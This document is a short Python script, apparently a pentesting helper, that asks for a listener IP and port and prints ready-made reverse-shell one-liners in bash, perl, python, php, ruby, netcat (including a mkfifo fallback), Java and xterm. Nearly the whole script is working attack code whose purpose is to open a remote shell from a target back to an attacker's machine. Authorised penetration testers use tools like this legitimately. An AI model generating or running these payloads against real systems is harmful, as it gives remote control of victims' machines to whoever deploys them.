#!/usr/bin/python3

reverse_shells = [
                  "bash",
                  "perl",
                  "python",
                  "php",
                  "ruby",
                  "netcat",
                  "java",
                  "xterm"
                 ]

def validate_ip(s):
    a = s.split('.')
    if len(a) != 4:
        return False
    for x in a:
        if not x.isdigit():
            return False
        i = int(x)
        if i <0 or i > 255:
            return False
    return True


while True:
    print("How would you like to create a reverse shell? (exit to exit program)")
    shell_type = input("> ").casefold()
    
    if shell_type in reverse_shells:
        while True:
            LHOST = input("\nEnter local host IP: ")
            if validate_ip(LHOST) == True:
                break
            else:
                print("Please enter a valid IP")

        LPORT = int(input("Enter port number to use: "))
        
        if shell_type == reverse_shells[0]:
            print(f"\nbash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1")
            break
        
        elif shell_type == reverse_shells[1]:
            print(f"""\nperl -e 'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'""")
            break

        elif shell_type == reverse_shells[2]:
            print(f"""\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""")
            break

        elif shell_type == reverse_shells[3]:
            print(f"""\nphp -r '$sock=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");'""")
            break
        elif shell_type == reverse_shells[4]:
            print(f"""\nruby -rsocket -e'f=TCPSocket.open("{LHOST}",{LPORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""")
            break
        elif shell_type == reverse_shells[5]:
            print(f"\nnc -e /bin/sh {LHOST} {LPORT}")
            print(f"""\nIf wrong version of netcat is installed, you might still be able to get reverse shell back with this: 

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f""")
            break

        elif shell_type == reverse_shells[6]:
            print(f"""\nr = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()""")
            break
        elif shell_type == reverse_shells[7]:
            target = input("Enter targets IP: ")
            print(f"\nxterm -display {LHOST}:{LPORT}")
            print("\nTo catch the incoming xterm, start an X-Server (:1 - which listens on TCP port 6001). This can be done with Xnest as shown below.")
            print("\nXnest :1")
            print("\nTarget will need to be authorized to connect to you.")
            print(f"\nxhost +{target}")
            break

    elif shell_type == "exit":
        break
    
    else:
        print(f"{shell_type} is not a valid option")
        print("Please select an option one of these options : " + ', '.join(reverse_shells))
